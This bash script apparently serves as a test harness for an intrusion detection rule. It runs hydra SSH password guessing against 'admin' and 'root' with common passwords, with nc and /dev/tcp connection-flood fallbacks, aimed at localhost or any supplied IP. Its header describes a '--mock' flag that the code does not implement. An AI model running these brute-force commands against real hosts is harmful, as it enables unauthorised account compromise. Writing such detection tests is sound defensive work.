#!/bin/bash
# =============================================================================
# attack_bruteforce.sh — Brute Force Attack Simulation
#
# Attempts SSH password brute force against localhost using hydra.
# Detected by BruteForceRule via auth-failure indicators on port 22 (SSH).
# Default threshold: 10 failures within 60 seconds → ThreatEvent.
#
# Requirements: 7.1
# Tools: hydra, sshd (running on target)
# Usage:  ./demo/attack_bruteforce.sh [target_ip]
#         Default target is 127.0.0.1
#
# NOTE: Requires an SSH server running on the target. For demo purposes,
#       use the --mock flag to only send TCP SYN packets to port 22
#       without completing the handshake (simpler but still detected).
# =============================================================================

set -euo pipefail

TARGET="${1:-127.0.0.1}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/attack_bruteforce.log"

echo "[*] Brute Force Attack against ${TARGET}" | tee "${LOG_FILE}"

# Check which tool is available
if command -v hydra &>/dev/null; then
    echo "[*] Using hydra for SSH brute force..." | tee -a "${LOG_FILE}"
    hydra -l admin -P /dev/stdin "${TARGET}" ssh \
      <<< $'password\n123456\nadmin\nroot\ntest\nletmein\nwelcome\nqwerty' \
      2>&1 | tee -a "${LOG_FILE}" || true

    hydra -l root -P /dev/stdin "${TARGET}" ssh \
      <<< $'toor\nadmin\n1234\npass\nsecret\ndemo\nhackme\nnetguard' \
      2>&1 | tee -a "${LOG_FILE}" || true

elif command -v nc &>/dev/null; then
    echo "[*] hydra not found — using nc to simulate connection attempts on port 22" | tee -a "${LOG_FILE}"
    for i in $(seq 1 20); do
      echo "  → Attempt ${i}/20 to ${TARGET}:22" | tee -a "${LOG_FILE}"
      timeout 1 nc -w 1 "${TARGET}" 22 2>/dev/null || true
      sleep 0.2
    done
else
    echo "[*] No brute-force tools found — using /dev/tcp fallback" | tee -a "${LOG_FILE}"
    for i in $(seq 1 20); do
      echo "  → Connection attempt ${i}/20 to ${TARGET}:22" | tee -a "${LOG_FILE}"
      timeout 1 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null || true
      sleep 0.2
    done
fi

echo "[*] Brute force simulation complete." | tee -a "${LOG_FILE}"
